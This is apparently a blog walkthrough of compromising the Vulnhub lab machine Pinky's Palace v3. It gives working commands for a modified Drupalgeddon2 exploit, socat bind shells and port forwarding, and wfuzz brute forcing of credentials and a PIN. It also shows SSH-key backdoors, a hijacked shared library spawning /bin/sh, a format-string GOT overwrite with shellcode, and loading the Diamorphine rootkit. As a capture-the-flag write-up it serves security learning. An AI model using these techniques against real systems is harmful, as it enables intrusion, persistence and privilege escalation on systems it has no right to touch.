---
published: true
---
Vulnhub virtual machine; Enter Version 3 - Experience of multiple engagements with WFUZZ to tunneling through socat and pivoting through ports. Take over a local global library file to encountering a buffer overflow print string bug. Finally, employing a custom kernel exploit. You will learn something new.

----------

Legal Usage:
*The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risk/responsibilities.*


----------


Vulnhub Link: https://www.vulnhub.com/entry/pinkys-palace-v3,237/
File: PinkysPalacev3.ova
Size: 689 MB

Discover VM on network:

    netdiscover -r 192.168.56.0/24

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553554945265_image.png)


Target: 192.168.56.118

verified via VM as-well: 

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553555008094_image.png)



# Enumeration

Nmap Scan:

    nmap -sV -sA -oA nmap/pinkyv3 192.168.56.118 --systemdns

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553555428935_image.png)


nothing really enumerated

Unicornscan UDP scan:

    unicornscan -mU -v -I 192.168.56.118

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553555527261_image.png)


again, nothing to note. 

Nmap Syn-scan:

    nmap -sS 192.168.56.118

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553555587483_image.png)


Well at this point we see we have an ftp, freeciv (no idea) and possible webserver http-alt.


Nmap Detailed Scan on open above ports:

    nmap -A -Pn -n -p21,5555,8000 192.168.56.118

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553557313204_image.png)



  Investigating `/CHANGELOG.txt` we are able to enumerate the exact version of Drupal
  to `7.57`
  
![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553557416707_image.png)


Navigating to webserver on port 8000:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553555700213_image.png)


indeed we have a web server which looks to possibly be  a drupal site.

create an account:


![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553555777673_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553555797615_image.png)


Searchsploit for Drupal:

    searchsploit drupal

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553557564289_image.png)


few interesting finds pertaining our scope and version number
`Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution       | exploits/php/webapps/44449.rb`

download locally and inspect

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553557655324_image.png)



Enumerate web server with gobuster:

    gobuster -u http://192.168.56.118:8000 -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553556158372_image.png)


FTP server:
Needed to enter with passive mode -p

    ftp -p 192.168.56.118

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553558253976_image.png)


Discovered WELCOME file along with firewall.sh

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553558289970_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553558314960_image.png)


if we can get to the box and see if this firewall is on a crontab or SUID we might be able to modify this in a way to get access to high privilege in the future.


Returning back to searchploit `44449.rb` after investigating a bit into the code I realized the code was set for POST instead of GET. Sifting through the code modifications were made to:

added function:

    def http_get(url, payload="")
      uri = URI(url)
      request = Net::HTTP::Get.new(uri.request_uri)
      request.initialize_http_header({"User-Agent" => $useragent})
      request.body = payload
      return $http.request(request)
    end


changed:

    # Check all
    url.each do|uri|
      # Check response
      response = http_get(uri)
    

Execute exploit

    ruby 44449.rb http://192.168.56.118:8000/

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553559079299_image.png)


we have a low level shell at this point!

Some things we know:

  - Box is behind a firewall
  - We have a low level shell
  - We want to upgrade

Upgrading low level shell:

First try, PentestMonkey Reverse Shells (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) - negative across the board


# socat - reverse connection

We need a bind shell and we just so happen to have `socat`. 

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553560475937_image.png)


For reference `socat` allows for tunneling, pivoting and we’ll call network mischief. 

setting up our connection on our victims box:

    socat TCP-LISTEN:9000,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane

connecting to socat locally:

    socat FILE:`tty`,raw,echo=0 TCP:192.168.56.118:9000

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553560766871_image.png)


we have a successful connection.

check network connections:

    netstat -lunt

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553560982988_image.png)


few more ports open here that we didn’t find initially.

Lets use `socat` to port forward the VM’s port 80 over port 4480
target:

    socat tcp-listen:4480,fork tcp:127.0.0.1:80 &

Local Kali navigate to port 4480

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553561592024_image.png)


`socat` made the hole for use to pass through.

Make another socat port forward hole with port 65334

    socat tcp-listen:4488,fork tcp:127.0.0.1:65334 &

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553561696492_image.png)


second port forward worked as well.


# Enter the FUZZ

wfuzz directory enumeration:

     wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --sc 200 -t 50 http://192.168.56.118:4488/FUZZ

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553640093296_image.png)


“/server-status” looks well worth taking a stab at.

Navigating to `/server-status`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553640191793_image.png)


wfuzz: 'files + extensions’

    wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt --sc 200 -t 50 http://192.168.56.118:4488/FUZZFUZ2Z

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553641741149_image.png)


`pwds.db` discovered

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553641839567_image.png)


downloaded list locally now lets see if we can make this list work with our PinkSec login page.

What we have at this point:

Possible Username: pinkadmin

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553642646973_image.png)


Password List: pwds.db

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553642703944_image.png)


Pin: In my mind pin’s are normally numbers. or 100,000 combinations
create pin list with crunch:

    crunch 5 5 1234567890 > crunchpins.txt

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553643652702_image.png)



# Brute Force Engage

with our combined information lets add it together and see if we can brute force this PinkySec Login page with wfuzz.

enumerating the correct username password:

    wfuzz -t 150 -w users.txt -w pwds.db -c -d "user=FUZZ&pass=FUZ2Z&pin=11111"  http://192.168.56.118:4480/login.php

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553643911179_image.png)


*in a sea of “45 Ch” we have a sole “41 Ch”*


    Username: pinkadmin
    Password: AaPinkSecaAdmin4467

now, lets figure out this pin with wfuzz (while hiding all other responses & 50 threads)

    wfuzz -w crunchpins.txt -c -d "user=pinkadmin&pass=AaPinkSecAdmin4467&pin=FUZZ" --hh 41,45 -t 50 http://192.168.56.118:4480/login.php

![](https://d2mxuefqeaa7sj.cloudfront.net/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553644679549_image.png)


we now own the pin “55849”

Login to web application with all credentials:

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553814570815_image.png)


next we setup a socat listener to connect to port 1337

    socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane

connect to newly open port 1337 via socat

    socat FILE:`tty`,raw,echo=0 TCP:192.168.56.118:1337

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553814841573_image.png)


we are now user: pinkysec

next, let’s move to install our ssh key to keep a backdoor.

Create SSH key for pinksec
Local kali:

    ssh-keygen -t rsa -b 2048

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553815003188_image.png)


cat public key so we can install it on our target:

    cat pinksec.pub

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553815088059_image.png)


target pinksec install ssh key:

    mkdir /home/pinksec/.ssh; echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7PS9b4hJ9xWrYxXRQfPtV/Djpgc/b2mQ39sfgKCf0p2pvmp9XxJRq+Fsjne+rftfMLsxY7h6jjI+4peMbiCVwtRB84KasjJcBe9JVzjQcNaW5tqzHQToJ8uhP0/97qW7XxebWflXl+qutSzDxZFJbR4CTsISjdBHDVHzHwPQNwJuBrNuwJ4l3h2CSV8R4IBqEjDGUHO3dL18nsWBwXueT9FFUn56DxxpFbawEDbbyrOUNcFq+SIyWWSG9Uzrzv6zPSDdtWCyLLrT3ZsSJg134WqZ2VXV8KMyXUfGTVmDzB6ji7MWWRAVYsHTgprlLCvoPH9ZrcdUi1UWLjYF8Kws9 root@execatwill  > /home/pinksec/.ssh/authorized_keys

quick test connection with ssh key:

    ssh -i pinksec pinksec@192.168.56.118 -p 5555

*port 5555 which we enumerated as SSH in our begin recon.*

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553815446024_image.png)


Next, we begin our enumeration all over again

$HOME directory

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553815590313_image.png)


`pinksecd` has a SUID sticky bit for user “pinksecmanagement”. We now need to figure out exactly how this binary works and figure out an exploit to escalate privileges.

perform `strings` on the binary and quicky see that the application is calling a global library file `libpinksec.so`

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553816053596_image.png)


For reference `.so` files refer to shared objects and/or libraries applications call locally.

Listing dependencies of a binary:

    ldd pinksecd

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553816228096_image.png)


we can see from our dependencies that `/lib/libpinksec.so` is writeable, which offers an entry way of taking over this shared object and take us further down the road

Navigate to location of `libpinksec.so`

    cd /lib/ && ls -al

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553816441036_image.png)


Our current location (sanity check):

- We know that `pinksecd` has a SUID for user “pinksecmanagement”
- We know that pinksecd calls on `libpinksec.so`
- We know the shared object is rewrite-able 

Re-writing libpinksec.so:
First, we create a script to take over a function and return a “/bin/sh”

    #include <unistd.h>
    
    void _init() {
      execve("/bin/sh", NULL, NULL);
    }

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553816903989_image.png)


compile our new code over libpinksec.so

    gcc -fPIC -shared -nostartfiles -o /lib/libpinksec.so ~/bin/libpinksec.c

Execute `pinksecd` 

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553817150429_image.png)


we have escalated to “pinksecmanagement”

Lets, create another SSH doorway, that we’ll be able to quickly reconnect if anything were to happen.

local kali:

    ssh-keygen -t rsa -b 2048

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553817307577_image.png)


target create our .ssh/authorized_keys 


    mkdir /home/pinksecmanagement/.ssh
    echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC10iRBva9qAHYuq4kcOeomPEU792Ml7WnudvZnz/FvOb+1G8Xpu9xeXduynT+ECey2Y8m+OzBEzW35aUpTZolJ96BpjCmPh14xz6/VToB9NmI32VrfG5iPK5LLsfb3IiwIKninLfKf0sAL/O6iWb4gcT4vrX1s5c0OkphfuOPw/f6TtpTx1UANeoz7zTNEb0z0RnIZZgcQRdemDyV/9LupXiiiYmEN34qybqlyMRbSE/VxAt5iru/qfZrovkjSb6OxqTGo2Ac8LtqhP4c4WiGqaKIuxjZIFhfOd7yWkPwcRzhHAKKW3prrt5FLGc9bRBO8yIzq4l1Qod/j6cj7zcpb root@execatwill  > /home/pinksecmanagement/.ssh/authorized_keys

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553817734389_image.png)


Connect via ssh to “pinksecmanagement”

    ssh -i pinksecman pinksecmanagement@192.168.56.118 -p 5555

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553817813694_image.png)


Enumeration re-begins, we found a SUID bit before lets see if another exists

    find ./ -perm -4000

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553817975763_image.png)


`PSMCCLI` definitely stands out 

navigate to location:

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553818046735_image.png)


and it just so happens to be owned by the one and only “pinky” 

![Pinky Cadillac GIF - Pinky Cadillac FridayAfterNext GIFs](https://media.tenor.com/images/3c1440ec7a22f6f8a97db08c4897dfa0/tenor.gif)


File `PSMCCLI`

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553818220923_image.png)


at this point we know we are dealing this a 32bit binary.


# Reverse Engineer PSMCCLI

Next, since gdb is not on our target box we need to get the file locally - first thought was `nc`  but we don’t have that luxury but we have base64

encode base64 PSMCCLI save to memory

    base64 PSMCCLI > /dev/shm

decode base64 on local kali

    base64 -d PSMCCLIb64.txt > PSMCCLI

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553820024291_image.png)


great, file is now local!


## Check binary protection

installed via `apt-get install devscripts`

    hardening-check

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553823766053_image.png)


Clear skies ahead~

 Move files with `socat`

1. Remote System:
    socat -u FILE:PSMCCLIb64 TCP-LISTEN:1338,reuseaddr 

![User-uploaded image: image.png](https://paper-attachments.dropbox.com/s_7A09BEDD0EDA038254090457BE7CF3F0AA3EBA1021DECE0A8FA63DE4EF27D05D_1553821811564_image.png)

2. Local System
    socat -u TCP:192.168.56.118:1338 OPEN:out.dat,creat

![User-uploaded image: image.png](https://paper-attachments.dropbox.com/s_7A09BEDD0EDA038254090457BE7CF3F0AA3EBA1021DECE0A8FA63DE4EF27D05D_1553821811564_image.png)

## Reverse Engineer `PSMCCLI`

fire up gdb-peda

    gdb ./PSMCCLI testtest

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553822852295_image.png)


break main and run

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553822884743_image.png)


disassemble main

    dissas main

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553822939275_image.png)


we are calling `argshow` function

disassemble `argshow`

    disass argshow

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553823022023_image.png)


which `argshow` is calling on a functions `printf` which is vulnerable to a format string `%x`. When we give the arg of `%x` we are telling printf to return the input in hexadecimal. 

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553823246016_image.png)


*to which is exactly what is returned.*

In this case we are going to use a 23byte shellcode to execve /bin/sh. To exploit the string bug the shell code is normally placed as an environment variable that is then called upon forcing the `/bin/sh`.

23byte /bin/sh shellcode: [http://shell-storm.org/shellcode/files/shellcode-827.php](http://shell-storm.org/shellcode/files/shellcode-827.php)


we need to find the exact location in which we can place our shellcode to execute in which `getenvaddr.c` comes into play:
link: https://raw.githubusercontent.com/Partyschaum/haxe/master/getenvaddr.c

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    
    int main(int argc, char *argv[]) {
            char *ptr;
    
            if(argc < 3) {
                    printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
                    exit(0);
            }
            ptr = getenv(argv[1]); /* get env var location */
            ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
            printf("%s will be at %p\n", argv[1], ptr);
    }

compile on “pinksecmanagement”

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553824228027_image.png)


gcc compile:

    gcc -o getenvaddr getenvaddr.c; chmod +x getenvaddr

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553824324954_image.png)


Current location (sanity check):

1. We know we have direct memory access using the `%x` and we can print any memory location on the stack
2. We can write to any location on the stat using `%n` which will count the characters printed to location.


----------

Using `objdump`  we can now combine these two vectors and overwrite the `putchar` and put our shell code to be called instead.


    objdump -R PSMCCLI

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553824679252_image.png)


the pointer for putchar is located at `0804a1c`.

add our shellcode as a variable and find our address to write with getenvaddr

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553825122654_image.png)



- Memory address: `0x0804a1c`
- Address to put shellcode: `0xbfffedd`


----------

Moved compile `getenvaddr` to `/tmp` and rand the rest of the commands from this directory.

Add 23byte shellcode for `/bin/sh` to an environment variable:
shell storm link: http://shell-storm.org/shellcode/files/shellcode-827.php 

    export SPAWN=$(python -c "print '[shellcode]'")

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553879848629_image.png)


Next, locate where the variable will be located in memory during the execution of the binary with `getenvaddr`

    ./getenvaddr SPAWN /usr/local/bin/PSMCCLI

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553879932771_image.png)


our goal now is to put the address from our SPAWN code `0xbffffe95` into the putchar `0x804a01c`

Checking to see if memory aligns correctly:

    /usr/local/bin/PSMCCLI AAAABBBB$(python -c "print '%08x.'*200") 

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553880262094_image.png)


*the 4 bytes of “A”s and “B”s are within our memory address where we will overwrite.*

Adding padding, with the stack not aligning quite right I had to add x2 "C”s for everything to sit correctly:

    /usr/local/bin/PSMCCLI AAAABBBBCC$(python -c "print '%08x.'*200")

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553880569576_image.png)



`0xbffffe95` = shell code location

    value to be written to lower short word: 0xfe95 = 65173
    value to be written to upper short word: 0xbfff = 49151


## Boy’s become Men

And it was at this point things quickly came off the rails. Basically finding the correct padding required for the shell code became an ever increasing problem. 3 days later a solution is found.

Enumerating the stack, from the above python script I quickly ran into issues as I was adding an extra 2 bytes with `%08x` along with some mind bending issues revolving using python to create the stack.

switching to perl and verifying with python things began to align.

On to the stack, and comparing them

perl:

     /usr/local/bin/PSMCCLI AAAABBBBCCC$(perl -e 'print "%x." x 137')

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553983645689_image.png)


python:

    /usr/local/bin/PSMCCLI AAAABBBBCCC$(python -c "print '%x.'*137")

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553983747757_image.png)


playing with both the padding of ‘C’s and narrowing down where they were located in this sequence began and repeated until I was able to align the A’s (41) and B’s (42). My combination that worked is as seen above.

next, we need to verify this location of our A’s and B’s due to the nature of this string exploit we can print off the stack with `%x` and eventually write to the stack with `%n`

Here is where problem 1 of many began,
passing our location the beginning of the A’s first thought of at being at `%134` yielded an output I was not expecting:

    /usr/local/bin/PSMCCLI AAAABBBBCCCC%134\$x 

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553984249838_image.png)


correct formatting is to add a 0 before the `x`

Enter script to find location of A’s 4141414

    or i in {1..200}; do echo -n $i ; /usr/local/bin/PSMCCLI AAAABBBBBCCCC%$i\$x ; done | grep 41414141 

playing around with this script and the amount of C’s for padding would grep the location of what is to be the beginning of the A’s

which before hand had me grasping at straws trying to find this location manually - only leading to much much frustration .

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553984835582_image.png)


Leading to the next major hurtle; Even after find the correct padding when I would give the arg with both address I wanted to print I would be taken somewhere completely different on the stack.


![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553985001925_image.png)


`%136` seemed to be my beginning but when I would add `%136` and `%137` together on the same line… instant rekt.

![super fun times](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553985082567_image.png)


and then the moment happened after much enumeration and adding a `0` to the `$x` to return the command:

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553985257852_image.png)



printing the entire correct string:

    /usr/local/bin/PSMCCLI AAAABBBBCCCC%134\$0x%135\$0x

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553984357769_image.png)


we now have the exact location of where we need to put the address to our shellcode.

Goal:  Push our shell code at address `0xbffffe95` over putchar `0x804a01c`

the exploit printf code that we will require will need to not only included our converted addresses to decimal but also include the offsets to be taken into consideration.

In this case 12 bytes were used `AA AA BB BB CC CC %134…` before the beginning of our code. Keep this value in the back of the mind.


## Enter the Seg Faults

To calculate the location of our shellcode in decimal two websites were used.

http://www.csgnetwork.com/hexaddsubcalc.html
https://www.rapidtables.com/convert/number/hex-to-decimal.html


    0xbffffe95 # orginal address of shellcode

first half=49151
second half=65173-12bytes = 65161


![negative calculated decimal](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1554134903223_image.png)
![added ’1” to hex value](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1554134948057_image.png)


second half first

    /usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CCCC%65161x%134\$hn

first half second - **extra 1 added to** `**0xbfff**` **now** `**0x1bfff**`

    /usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CCCC%65161x%134\$hn%49514x%135\$hn


WORKING EXPLOIT

    /usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CCCC%65161x%134\$0hn%49514x%135\$0hn

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553986109665_image.png)


![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553986412562_file.png)




# Priv-esc from Pinky

first and foremost move to create SSH key

Create ssh-keygen locally as done before:

    ssh-keygen -t rsa -b 2048

![User-uploaded image: image.png](https://paper-attachments.dropbox.com/s_7A09BEDD0EDA038254090457BE7CF3F0AA3EBA1021DECE0A8FA63DE4EF27D05D_1553983048094_image.png)


echo key to `.ssh/authorized_keys`

    echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5GexhwQxG5bgT+NteOrDkUKXctV/MBSG1svAzYzUS98YuR2Rc9fctKyuxF5v7nQTkSpJKYiasarF14MtEm3N2JOIUiJapBWh9yncuYkuC/dpv/guvxcQHcIHbr8me0L817T9ozJEUlrhvShzwcuG3o+ie4HWY4DdV+duFLahSgdURhS6mYKrfwUXnTFQc4HvAQ7gjkAgDmayWv7i5CEaaW/1DqKsefImT+JjhuDtprinXExxGqCim9Eyr1NB+c1goBFdevOwRe/taS3urHXy62/QFyrIaPDkR6shKVkpqY+qvfiqG5Q8LXiLoWXNs6u07XUNlrkz2AMi+xraJyN33 root@execatwill > /home/pinky/.ssh/authorized_keys

![](https://paper-attachments.dropbox.com/s_7A09BEDD0EDA038254090457BE7CF3F0AA3EBA1021DECE0A8FA63DE4EF27D05D_1553983075757_image.png)


Connect to SSH

    ssh -i pinky pinky@192.168.56.119 -p 5555

*note: IP changed as I restarted the box thinking I had messed up PSMCCLI*


![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553986664477_image.png)


Privilege check with sudo

    sudo -l

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1553986774854_image.png)


two binaries look to be able to run as root. Both are kernel modules and and which will require to be re-wrote or we can use a rootkit Diamorphine (github link: https://github.com/m0nad/Diamorphine)


# Path to Root

Premade-Kernal Exploit Diamorphine Install:
This exploit is unique in that it allow for it to be ran via an invisuble module sending a signal 64 to any pid.

Verify the kernal is at least 2.6x/3.x/4.x

    uname -r

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1554050118743_image.png)


Downloaded clone of repository && move `diamorphine.c`, `diamorphine.h` and `Makefile` to target and `make`:

    git clone https://github.com/m0nad/Diamorphine.git

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1554050222124_image.png)


Execute insmod with sudo:

    sudo /sbin/insmod diamorphine.ko

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1554050339259_image.png)


Kill a pid with `-64` invisibility:

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1554050369157_image.png)




## Root&Loot
    cat /root/root.txt

![](https://paper-attachments.dropbox.com/s_E629904ADD63961C3017402B2CAC04CCE6B65A453AE29E259CD60CE0EC42430D_1554050448137_image.png)


“Bring me the root!” -exec

